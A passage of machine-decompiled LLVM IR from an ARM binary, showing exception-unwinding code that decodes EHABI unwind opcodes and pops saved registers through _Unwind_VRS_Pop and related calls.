  %v5_1ad60 = call i32 @_Unwind_VRS_Get(i32 %v0_1ad58, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_1ad68 = load i32, i32* @r7, align 4
  store i32 %v0_1ad68, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_1ad78 = call i32 @_Unwind_VRS_Set(i32 %v0_1ad68, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1ad78, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ab9c.backedge

dec_label_pc_1ad80:                               ; preds = %dec_label_pc_1acb8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1ad90 = load i32, i32* @r7, align 4
  store i32 %v0_1ad90, i32* %r0.global-to-local, align 4
  %v7_1ad98 = call i32 @_Unwind_VRS_Get(i32 %v0_1ad90, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_1ad9c = load i32, i32* @r7, align 4
  store i32 %v0_1ad9c, i32* %r0.global-to-local, align 4
  %v0_1ada0 = load i32, i32* @sl, align 4
  store i32 %v0_1ada0, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_1ada0, i32* %r3.global-to-local, align 4
  %v5_1adb0 = call i32 @_Unwind_VRS_Set(i32 %v0_1ad9c, i32 %v0_1ada0, i32 15, i32 %v0_1ada0, i8* bitcast (i32* @0 to i8*))
  %v0_1adb4 = load i32, i32* @sl, align 4
  store i32 %v0_1adb4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1acc4

dec_label_pc_1adbc:                               ; preds = %dec_label_pc_1afb0
  %v7_1adbc = icmp eq i32 %v0_1afb0, 199
  store i1 %v7_1adbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1adbc, label %dec_label_pc_1b090, label %dec_label_pc_1adc4

dec_label_pc_1adc4:                               ; preds = %dec_label_pc_1adbc
  %v1_1adc4 = and i32 %v0_1abf4, 248
  store i32 %v1_1adc4, i32* %r3.global-to-local, align 4
  %v7_1adc8 = icmp eq i32 %v1_1adc4, 192
  store i1 %v7_1adc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1adc8, label %.thread24, label %dec_label_pc_1ade0

.thread24:                                        ; preds = %dec_label_pc_1adc4
  %v2_1adcc = urem i32 %v0_1abf4, 16
  %v2_1add0 = add nuw nsw i32 %v2_1adcc, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_1add8 = or i32 %v2_1add0, 655360
  store i32 %v2_1add8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ae9c

dec_label_pc_1ade0:                               ; preds = %dec_label_pc_1adc4
  %v7_1ade0 = icmp eq i32 %v0_1afb0, 200
  store i1 %v7_1ade0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ade0, label %dec_label_pc_1b024, label %dec_label_pc_1ade8

dec_label_pc_1ade8:                               ; preds = %dec_label_pc_1ade0
  %v7_1ade8 = icmp eq i32 %v0_1afb0, 201
  store i1 %v7_1ade8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ade8, label %dec_label_pc_1adf0, label %dec_label_pc_1ae6c

dec_label_pc_1adf0:                               ; preds = %dec_label_pc_1ade8
  %v0_1adf0 = load i32, i32* @r5, align 4
  %v1_1adf0 = add i32 %v0_1adf0, 8
  %v2_1adf0 = inttoptr i32 %v1_1adf0 to i8*
  %v3_1adf0 = load i8, i8* %v2_1adf0, align 1
  %v4_1adf0 = zext i8 %v3_1adf0 to i32
  store i32 %v4_1adf0, i32* %r3.global-to-local, align 4
  %v2_1adf4 = icmp eq i8 %v3_1adf0, 0
  store i1 %v2_1adf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1adf4, label %dec_label_pc_1ae04, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_1adf0
  %v2_1adf8 = add nsw i32 %v4_1adf0, -1
  store i32 %v2_1adf8, i32* %r3.global-to-local, align 4
  %v2_1adfc = trunc i32 %v2_1adf8 to i8
  store i8 %v2_1adfc, i8* %v2_1adf0, align 1
  %v0_1ae00.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1ae00.pr.pr, label %.thread26.dec_label_pc_1ae04_crit_edge, label %dec_label_pc_1ae38

.thread26.dec_label_pc_1ae04_crit_edge:           ; preds = %.thread26
  %v0_1ae04.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ae04

dec_label_pc_1ae04:                               ; preds = %.thread26.dec_label_pc_1ae04_crit_edge, %dec_label_pc_1adf0
  %v2_1ae1c = phi i32 [ %v0_1ae04.pre, %.thread26.dec_label_pc_1ae04_crit_edge ], [ %v0_1adf0, %dec_label_pc_1adf0 ]
  %v1_1ae04 = add i32 %v2_1ae1c, 9
  %v2_1ae04 = inttoptr i32 %v1_1ae04 to i8*
  %v3_1ae04 = load i8, i8* %v2_1ae04, align 1
  %v4_1ae04 = zext i8 %v3_1ae04 to i32
  store i32 %v4_1ae04, i32* %r3.global-to-local, align 4
  %v2_1ae08 = icmp eq i8 %v3_1ae04, 0
  store i1 %v2_1ae08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ae08, label %dec_label_pc_1ae54, label %dec_label_pc_1ae18

dec_label_pc_1ae18:                               ; preds = %dec_label_pc_1ae04
  %v1_1ae18 = add nsw i32 %v4_1ae04, -1
  store i32 %v1_1ae18, i32* %r3.global-to-local, align 4
  %v1_1ae1c = trunc i32 %v1_1ae18 to i8
  store i8 %v1_1ae1c, i8* %v2_1ae04, align 1
  %v0_1ae20 = load i32, i32* @r5, align 4
  %v1_1ae20 = add i32 %v0_1ae20, 4
  %v2_1ae20 = inttoptr i32 %v1_1ae20 to i32*
  %v3_1ae20 = load i32, i32* %v2_1ae20, align 4
  store i32 %v3_1ae20, i32* %r2.global-to-local, align 4
  %v1_1ae24 = inttoptr i32 %v3_1ae20 to i32*
  %v2_1ae24 = load i32, i32* %v1_1ae24, align 4
  store i32 %v2_1ae24, i32* %r0.global-to-local, align 4
  %v4_1ae24 = add i32 %v3_1ae20, 4
  store i32 %v4_1ae24, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1ae24, i32* %v2_1ae20, align 4
  %v0_1ae30 = load i32, i32* %r3.global-to-local, align 4
  %v1_1ae30 = trunc i32 %v0_1ae30 to i8
  %v2_1ae30 = load i32, i32* @r5, align 4
  %v3_1ae30 = add i32 %v2_1ae30, 8
  %v4_1ae30 = inttoptr i32 %v3_1ae30 to i8*
  store i8 %v1_1ae30, i8* %v4_1ae30, align 1
  %v0_1ae34 = load i32, i32* %r0.global-to-local, align 4
  %v1_1ae34 = load i32, i32* @r5, align 4
  %v2_1ae34 = inttoptr i32 %v1_1ae34 to i32*
  store i32 %v0_1ae34, i32* %v2_1ae34, align 4
  br label %dec_label_pc_1ae38

dec_label_pc_1ae38:                               ; preds = %.thread26, %dec_label_pc_1ae18
  %v0_1ae38 = load i32, i32* %r0.global-to-local, align 4
  %v3_1ae38 = udiv i32 %v0_1ae38, 16777216
  %v1_1ae3c = urem i32 %v3_1ae38, 16
  %v3_1ae40 = mul i32 %v0_1ae38, 256
  %v1_1ae44 = add nuw nsw i32 %v1_1ae3c, 1
  store i32 %v1_1ae44, i32* %r1.global-to-local, align 4
  %v1_1ae48 = and i32 %v3_1ae38, 240
  store i32 %v1_1ae48, i32* %r3.global-to-local, align 4
  %v1_1ae4c = load i32, i32* @r5, align 4
  %v2_1ae4c = inttoptr i32 %v1_1ae4c to i32*
  store i32 %v3_1ae40, i32* %v2_1ae4c, align 4
  %v0_1ae50 = load i32, i32* %r1.global-to-local, align 4
  %v1_1ae50 = load i32, i32* %r3.global-to-local, align 4
  %v4_1ae50 = mul i32 %v1_1ae50, 4096
  %v5_1ae50 = or i32 %v4_1ae50, %v0_1ae50
  br label %dec_label_pc_1ae54

dec_label_pc_1ae54:                               ; preds = %dec_label_pc_1ae04, %dec_label_pc_1ae38
  %storemerge = phi i32 [ %v5_1ae50, %dec_label_pc_1ae38 ], [ 720897, %dec_label_pc_1ae04 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_1ae54 = load i32, i32* @r7, align 4
  store i32 %v0_1ae54, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_1ae60 = call i32 @_Unwind_VRS_Pop(i32 %v0_1ae54, i32 1, i32 5, i32 5)
  store i32 %v4_1ae60, i32* %r0.global-to-local, align 4
  %v2_1ae64 = icmp eq i32 %v4_1ae60, 0
  store i1 %v2_1ae64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ae64, label %dec_label_pc_1ab9c.backedge, label %dec_label_pc_1ae6c

dec_label_pc_1ae6c:                               ; preds = %dec_label_pc_1b0b8, %dec_label_pc_1ade8, %dec_label_pc_1aec8, %dec_label_pc_1b26c, %dec_label_pc_1b23c, %dec_label_pc_1b218, %dec_label_pc_1b0a4, %dec_label_pc_1ae54, %dec_label_pc_1ac68, %dec_label_pc_1ac5c, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1acc4

dec_label_pc_1ae74:                               ; preds = %dec_label_pc_1ad2c
  %v7_1ae74 = icmp eq i32 %v1_1abfc, 160
  store i1 %v7_1ae74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ae74, label %dec_label_pc_1ae7c, label %dec_label_pc_1aeb8

dec_label_pc_1ae7c:                               ; preds = %dec_label_pc_1ae74
  %v0_1ae7c = load i32, i32* %ip.global-to-local, align 4
  %v1_1ae7c = urem i32 %v0_1ae7c, 8
  %v1_1ae80 = xor i32 %v1_1ae7c, 7
  store i32 %v1_1ae80, i32* %r3.global-to-local, align 4
  %v6_1ae88 = lshr i32 4080, %v1_1ae80
  %v1_1ae8c = and i32 %v0_1abf4, 8
  %v2_1ae8c = icmp eq i32 %v1_1ae8c, 0
  store i1 %v2_1ae8c, i1* %cpsr_z.global-to-local, align 1
  %v1_1ae90 = and i32 %v6_1ae88, 4080
  %tmp155 = mul nuw nsw i32 %v1_1ae8c, 2048
  %tmp156 = or i32 %v1_1ae90, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1ae9c

dec_label_pc_1ae9c:                               ; preds = %.thread44, %.thread24, %dec_label_pc_1b22c.dec_label_pc_1ae9c_crit_edge, %bb157, %dec_label_pc_1b088, %dec_label_pc_1b01c, %dec_label_pc_1af7c, %dec_label_pc_1ae7c
  %v2_1aea4 = phi i32 [ %v2_1afa0, %.thread44 ], [ %v2_1afa8, %bb157 ], [ %v2_1aea4.pre, %dec_label_pc_1b22c.dec_label_pc_1ae9c_crit_edge ], [ %v2_1add8, %.thread24 ], [ %storemerge130, %dec_label_pc_1b088 ], [ %storemerge131, %dec_label_pc_1b01c ], [ %storemerge132, %dec_label_pc_1af7c ], [ %tmp156, %dec_label_pc_1ae7c ]
  %v0_1aea0 = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_1b22c.dec_label_pc_1ae9c_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_1b088 ], [ 3, %dec_label_pc_1b01c ], [ 1, %dec_label_pc_1af7c ], [ 0, %dec_label_pc_1ae7c ]
  %v0_1ae9c = load i32, i32* @r7, align 4
  store i32 %v0_1ae9c, i32* %r0.global-to-local, align 4
  store i32 %v0_1aea0, i32* %r3.global-to-local, align 4
  %v4_1aea4 = call i32 @_Unwind_VRS_Pop(i32 %v0_1ae9c, i32 %v0_1aea0, i32 %v2_1aea4, i32 %v0_1aea0)
  store i32 %v4_1aea4, i32* %r0.global-to-local, align 4
  %v2_1aea8 = icmp eq i32 %v4_1aea4, 0
  store i1 %v2_1aea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1aea8, label %dec_label_pc_1ab9c.backedge, label %dec_label_pc_1aeb0

dec_label_pc_1aeb0:                               ; preds = %dec_label_pc_1ae9c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1acc4

dec_label_pc_1aeb8:                               ; preds = %dec_label_pc_1ae74
  %v7_1aeb8 = icmp eq i32 %v1_1abfc, 176
  store i1 %v7_1aeb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1aeb8, label %dec_label_pc_1af00, label %dec_label_pc_1aec0

dec_label_pc_1aec0:                               ; preds = %dec_label_pc_1aeb8
  %v7_1aec0 = icmp eq i32 %v1_1abfc, 192
  store i1 %v7_1aec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1aec0, label %dec_label_pc_1afb0, label %dec_label_pc_1aec8

dec_label_pc_1aec8:                               ; preds = %dec_label_pc_1aec0
  %v1_1aec8 = and i32 %v0_1abf4, 248
  store i32 %v1_1aec8, i32* %r3.global-to-local, align 4
  %v7_1aecc = icmp eq i32 %v1_1aec8, 208
  store i1 %v7_1aecc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1aecc, label %dec_label_pc_1aed4, label %dec_label_pc_1ae6c

dec_label_pc_1aed4:                               ; preds = %dec_label_pc_1aec8
  %v1_1aed4 = urem i32 %v0_1abf4, 8
  %v1_1aed8 = add nuw nsw i32 %v1_1aed4, 1
  %v1_1aedc = or i32 %v1_1aed8, 524288
  store i32 %v1_1aedc, i32* %r2.global-to-local, align 4
  %v0_1aee0 = load i32, i32* @r7, align 4
  store i32 %v0_1aee0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_1aeec = call i32 @_Unwind_VRS_Pop(i32 %v0_1aee0, i32 1, i32 %v1_1aedc, i32 5)
  store i32 %v4_1aeec, i32* %r0.global-to-local, align 4
  %v2_1aef0 = icmp eq i32 %v4_1aeec, 0
  store i1 %v2_1aef0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1aef0, label %dec_label_pc_1ab9c.backedge, label %dec_label_pc_1aef8

dec_label_pc_1aef8:                               ; preds = %dec_label_pc_1aed4
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1acc4

dec_label_pc_1af00:                               ; preds = %dec_label_pc_1aeb8
  %v0_1af00 = load i32, i32* %ip.global-to-local, align 4
  %v7_1af00 = icmp eq i32 %v0_1af00, 177
  store i1 %v7_1af00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1af00, label %dec_label_pc_1b204, label %dec_label_pc_1af08

dec_label_pc_1af08:                               ; preds = %dec_label_pc_1af00
  %v7_1af08 = icmp eq i32 %v0_1af00, 178
  store i1 %v7_1af08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1af08, label %dec_label_pc_1b0dc, label %dec_label_pc_1af10

dec_label_pc_1af10:                               ; preds = %dec_label_pc_1af08
  %v7_1af10 = icmp eq i32 %v0_1af00, 179
  store i1 %v7_1af10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1af10, label %dec_label_pc_1af18, label %dec_label_pc_1af84

dec_label_pc_1af18:                               ; preds = %dec_label_pc_1af10
  %v0_1af18 = load i32, i32* @r5, align 4
  %v1_1af18 = add i32 %v0_1af18, 8
  %v2_1af18 = inttoptr i32 %v1_1af18 to i8*
  %v3_1af18 = load i8, i8* %v2_1af18, align 1
  %v4_1af18 = zext i8 %v3_1af18 to i32
  store i32 %v4_1af18, i32* %r3.global-to-local, align 4
  %v2_1af1c = icmp eq i8 %v3_1af18, 0
  store i1 %v2_1af1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1af1c, label %dec_label_pc_1af2c, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_1af18
  %v2_1af20 = add nsw i32 %v4_1af18, -1
  store i32 %v2_1af20, i32* %r3.global-to-local, align 4
  %v2_1af24 = trunc i32 %v2_1af20 to i8
  store i8 %v2_1af24, i8* %v2_1af18, align 1
  %v0_1af28.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1af28.pr.pr, label %.thread30.dec_label_pc_1af2c_crit_edge, label %dec_label_pc_1af60

.thread30.dec_label_pc_1af2c_crit_edge:           ; preds = %.thread30
  %v0_1af2c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1af2c

dec_label_pc_1af2c:                               ; preds = %.thread30.dec_label_pc_1af2c_crit_edge, %dec_label_pc_1af18
  %v2_1af44 = phi i32 [ %v0_1af2c.pre, %.thread30.dec_label_pc_1af2c_crit_edge ], [ %v0_1af18, %dec_label_pc_1af18 ]
  %v1_1af2c = add i32 %v2_1af44, 9
  %v2_1af2c = inttoptr i32 %v1_1af2c to i8*
  %v3_1af2c = load i8, i8* %v2_1af2c, align 1
  %v4_1af2c = zext i8 %v3_1af2c to i32
  store i32 %v4_1af2c, i32* %r3.global-to-local, align 4
  %v2_1af30 = icmp eq i8 %v3_1af2c, 0
  store i1 %v2_1af30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1af30, label %dec_label_pc_1af7c, label %dec_label_pc_1af40

dec_label_pc_1af40:                               ; preds = %dec_label_pc_1af2c
  %v1_1af40 = add nsw i32 %v4_1af2c, -1
  store i32 %v1_1af40, i32* %r3.global-to-local, align 4
  %v1_1af44 = trunc i32 %v1_1af40 to i8
  store i8 %v1_1af44, i8* %v2_1af2c, align 1
  %v0_1af48 = load i32, i32* @r5, align 4
  %v1_1af48 = add i32 %v0_1af48, 4
  %v2_1af48 = inttoptr i32 %v1_1af48 to i32*
  %v3_1af48 = load i32, i32* %v2_1af48, align 4
  store i32 %v3_1af48, i32* %r2.global-to-local, align 4
  %v1_1af4c = inttoptr i32 %v3_1af48 to i32*
  %v2_1af4c = load i32, i32* %v1_1af4c, align 4
  store i32 %v2_1af4c, i32* %r0.global-to-local, align 4
  %v4_1af4c = add i32 %v3_1af48, 4
  store i32 %v4_1af4c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1af4c, i32* %v2_1af48, align 4
  %v0_1af58 = load i32, i32* %r3.global-to-local, align 4
  %v1_1af58 = trunc i32 %v0_1af58 to i8
  %v2_1af58 = load i32, i32* @r5, align 4
  %v3_1af58 = add i32 %v2_1af58, 8
  %v4_1af58 = inttoptr i32 %v3_1af58 to i8*
  store i8 %v1_1af58, i8* %v4_1af58, align 1
  %v0_1af5c = load i32, i32* %r0.global-to-local, align 4
  %v1_1af5c = load i32, i32* @r5, align 4
  %v2_1af5c = inttoptr i32 %v1_1af5c to i32*
  store i32 %v0_1af5c, i32* %v2_1af5c, align 4
  br label %dec_label_pc_1af60

dec_label_pc_1af60:                               ; preds = %.thread30, %dec_label_pc_1af40
  %v0_1af60 = load i32, i32* %r0.global-to-local, align 4
  %v3_1af60 = udiv i32 %v0_1af60, 16777216
  %v1_1af64 = urem i32 %v3_1af60, 16
  %v3_1af68 = mul i32 %v0_1af60, 256
  store i32 %v3_1af68, i32* %r0.global-to-local, align 4
  %v1_1af6c = add nuw nsw i32 %v1_1af64, 1
  store i32 %v1_1af6c, i32* %r2.global-to-local, align 4
  %v1_1af70 = and i32 %v3_1af60, 240
  store i32 %v1_1af70, i32* %r3.global-to-local, align 4
  %v1_1af74 = load i32, i32* @r5, align 4
  %v2_1af74 = inttoptr i32 %v1_1af74 to i32*
  store i32 %v3_1af68, i32* %v2_1af74, align 4
  %v0_1af78 = load i32, i32* %r2.global-to-local, align 4
  %v1_1af78 = load i32, i32* %r3.global-to-local, align 4
  %v4_1af78 = mul i32 %v1_1af78, 4096
  %v5_1af78 = or i32 %v4_1af78, %v0_1af78
  br label %dec_label_pc_1af7c

dec_label_pc_1af7c:                               ; preds = %dec_label_pc_1af2c, %dec_label_pc_1af60
  %storemerge132 = phi i32 [ %v5_1af78, %dec_label_pc_1af60 ], [ 720897, %dec_label_pc_1af2c ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1ae9c

dec_label_pc_1af84:                               ; preds = %dec_label_pc_1af10
  %v1_1af84 = and i32 %v0_1abf4, 252
  store i32 %v1_1af84, i32* %r3.global-to-local, align 4
  %v7_1af88 = icmp eq i32 %v1_1af84, 180
  store i1 %v7_1af88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1af88, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_1af84
  %v2_1af8c = urem i32 %v0_1abf4, 4
  %v2_1af94 = add nuw nsw i32 %v2_1af8c, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_1afa0 = or i32 %v2_1af94, 262144
  store i32 %v2_1afa0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ae9c

bb157:                                            ; preds = %dec_label_pc_1af84
  %v2_1af90 = urem i32 %v0_1af00, 8
  %v2_1af98 = add nuw nsw i32 %v2_1af90, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_1afa8 = or i32 %v2_1af98, 524288
  store i32 %v2_1afa8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ae9c

dec_label_pc_1afb0:                               ; preds = %dec_label_pc_1aec0
  %v0_1afb0 = load i32, i32* %ip.global-to-local, align 4
  %v7_1afb0 = icmp eq i32 %v0_1afb0, 198
  store i1 %v7_1afb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1afb0, label %dec_label_pc_1afb8, label %dec_label_pc_1adbc

dec_label_pc_1afb8:                               ; preds = %dec_label_pc_1afb0
  %v0_1afb8 = load i32, i32* @r5, align 4
  %v1_1afb8 = add i32 %v0_1afb8, 8
  %v2_1afb8 = inttoptr i32 %v1_1afb8 to i8*
  %v3_1afb8 = load i8, i8* %v2_1afb8, align 1
  %v4_1afb8 = zext i8 %v3_1afb8 to i32
  store i32 %v4_1afb8, i32* %r3.global-to-local, align 4
  %v2_1afbc = icmp eq i8 %v3_1afb8, 0
  store i1 %v2_1afbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1afbc, label %dec_label_pc_1afcc, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_1afb8
  %v2_1afc0 = add nsw i32 %v4_1afb8, -1
  store i32 %v2_1afc0, i32* %r3.global-to-local, align 4
  %v2_1afc4 = trunc i32 %v2_1afc0 to i8
  store i8 %v2_1afc4, i8* %v2_1afb8, align 1
  %v0_1afc8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1afc8.pr.pr, label %.thread48.dec_label_pc_1afcc_crit_edge, label %dec_label_pc_1b000

.thread48.dec_label_pc_1afcc_crit_edge:           ; preds = %.thread48
  %v0_1afcc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1afcc

dec_label_pc_1afcc:                               ; preds = %.thread48.dec_label_pc_1afcc_crit_edge, %dec_label_pc_1afb8
  %v2_1afe4 = phi i32 [ %v0_1afcc.pre, %.thread48.dec_label_pc_1afcc_crit_edge ], [ %v0_1afb8, %dec_label_pc_1afb8 ]
  %v1_1afcc = add i32 %v2_1afe4, 9
  %v2_1afcc = inttoptr i32 %v1_1afcc to i8*
  %v3_1afcc = load i8, i8* %v2_1afcc, align 1
  %v4_1afcc = zext i8 %v3_1afcc to i32
  store i32 %v4_1afcc, i32* %r3.global-to-local, align 4
  %v2_1afd0 = icmp eq i8 %v3_1afcc, 0
  store i1 %v2_1afd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1afd0, label %dec_label_pc_1b01c, label %dec_label_pc_1afe0

dec_label_pc_1afe0:                               ; preds = %dec_label_pc_1afcc
  %v1_1afe0 = add nsw i32 %v4_1afcc, -1
  store i32 %v1_1afe0, i32* %r3.global-to-local, align 4
  %v1_1afe4 = trunc i32 %v1_1afe0 to i8
  store i8 %v1_1afe4, i8* %v2_1afcc, align 1
  %v0_1afe8 = load i32, i32* @r5, align 4
  %v1_1afe8 = add i32 %v0_1afe8, 4
  %v2_1afe8 = inttoptr i32 %v1_1afe8 to i32*
  %v3_1afe8 = load i32, i32* %v2_1afe8, align 4
  store i32 %v3_1afe8, i32* %r2.global-to-local, align 4
  %v1_1afec = inttoptr i32 %v3_1afe8 to i32*
  %v2_1afec = load i32, i32* %v1_1afec, align 4
  store i32 %v2_1afec, i32* %r0.global-to-local, align 4
  %v4_1afec = add i32 %v3_1afe8, 4
  store i32 %v4_1afec, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1afec, i32* %v2_1afe8, align 4
  %v0_1aff8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1aff8 = trunc i32 %v0_1aff8 to i8
  %v2_1aff8 = load i32, i32* @r5, align 4
  %v3_1aff8 = add i32 %v2_1aff8, 8
  %v4_1aff8 = inttoptr i32 %v3_1aff8 to i8*
  store i8 %v1_1aff8, i8* %v4_1aff8, align 1
  %v0_1affc = load i32, i32* %r0.global-to-local, align 4
  %v1_1affc = load i32, i32* @r5, align 4
  %v2_1affc = inttoptr i32 %v1_1affc to i32*
  store i32 %v0_1affc, i32* %v2_1affc, align 4
  br label %dec_label_pc_1b000

dec_label_pc_1b000:                               ; preds = %.thread48, %dec_label_pc_1afe0
  %v0_1b000 = load i32, i32* %r0.global-to-local, align 4
  %v3_1b000 = udiv i32 %v0_1b000, 16777216
  %v1_1b004 = urem i32 %v3_1b000, 16
  %v3_1b008 = mul i32 %v0_1b000, 256
  store i32 %v3_1b008, i32* %r0.global-to-local, align 4
  %v1_1b00c = add nuw nsw i32 %v1_1b004, 1
  store i32 %v1_1b00c, i32* %r2.global-to-local, align 4
  %v1_1b010 = and i32 %v3_1b000, 240
  store i32 %v1_1b010, i32* %r3.global-to-local, align 4
  %v1_1b014 = load i32, i32* @r5, align 4
  %v2_1b014 = inttoptr i32 %v1_1b014 to i32*
  store i32 %v3_1b008, i32* %v2_1b014, align 4
  %v0_1b018 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b018 = load i32, i32* %r3.global-to-local, align 4
  %v4_1b018 = mul i32 %v1_1b018, 4096
  %v5_1b018 = or i32 %v4_1b018, %v0_1b018
  br label %dec_label_pc_1b01c

dec_label_pc_1b01c:                               ; preds = %dec_label_pc_1afcc, %dec_label_pc_1b000
  %storemerge131 = phi i32 [ %v5_1b018, %dec_label_pc_1b000 ], [ 720897, %dec_label_pc_1afcc ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1ae9c

dec_label_pc_1b024:                               ; preds = %dec_label_pc_1ade0
  %v0_1b024 = load i32, i32* @r5, align 4
  %v1_1b024 = add i32 %v0_1b024, 8
  %v2_1b024 = inttoptr i32 %v1_1b024 to i8*
  %v3_1b024 = load i8, i8* %v2_1b024, align 1
  %v4_1b024 = zext i8 %v3_1b024 to i32
  store i32 %v4_1b024, i32* %r3.global-to-local, align 4
  %v2_1b028 = icmp eq i8 %v3_1b024, 0
  store i1 %v2_1b028, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b028, label %dec_label_pc_1b038, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_1b024
  %v2_1b02c = add nsw i32 %v4_1b024, -1
  store i32 %v2_1b02c, i32* %r3.global-to-local, align 4
  %v2_1b030 = trunc i32 %v2_1b02c to i8
  store i8 %v2_1b030, i8* %v2_1b024, align 1
  %v0_1b034.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1b034.pr.pr, label %.thread52.dec_label_pc_1b038_crit_edge, label %dec_label_pc_1b06c

.thread52.dec_label_pc_1b038_crit_edge:           ; preds = %.thread52
  %v0_1b038.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b038

dec_label_pc_1b038:                               ; preds = %.thread52.dec_label_pc_1b038_crit_edge, %dec_label_pc_1b024
  %v2_1b050 = phi i32 [ %v0_1b038.pre, %.thread52.dec_label_pc_1b038_crit_edge ], [ %v0_1b024, %dec_label_pc_1b024 ]
  %v1_1b038 = add i32 %v2_1b050, 9
  %v2_1b038 = inttoptr i32 %v1_1b038 to i8*
  %v3_1b038 = load i8, i8* %v2_1b038, align 1
  %v4_1b038 = zext i8 %v3_1b038 to i32
  store i32 %v4_1b038, i32* %r3.global-to-local, align 4
  %v2_1b03c = icmp eq i8 %v3_1b038, 0
  store i1 %v2_1b03c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b03c, label %dec_label_pc_1b088, label %dec_label_pc_1b04c

dec_label_pc_1b04c:                               ; preds = %dec_label_pc_1b038
  %v1_1b04c = add nsw i32 %v4_1b038, -1
  store i32 %v1_1b04c, i32* %r3.global-to-local, align 4
  %v1_1b050 = trunc i32 %v1_1b04c to i8
  store i8 %v1_1b050, i8* %v2_1b038, align 1
  %v0_1b054 = load i32, i32* @r5, align 4
  %v1_1b054 = add i32 %v0_1b054, 4
  %v2_1b054 = inttoptr i32 %v1_1b054 to i32*
  %v3_1b054 = load i32, i32* %v2_1b054, align 4
  store i32 %v3_1b054, i32* %r2.global-to-local, align 4
  %v1_1b058 = inttoptr i32 %v3_1b054 to i32*
  %v2_1b058 = load i32, i32* %v1_1b058, align 4
  store i32 %v2_1b058, i32* %r0.global-to-local, align 4
  %v4_1b058 = add i32 %v3_1b054, 4
  store i32 %v4_1b058, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1b058, i32* %v2_1b054, align 4
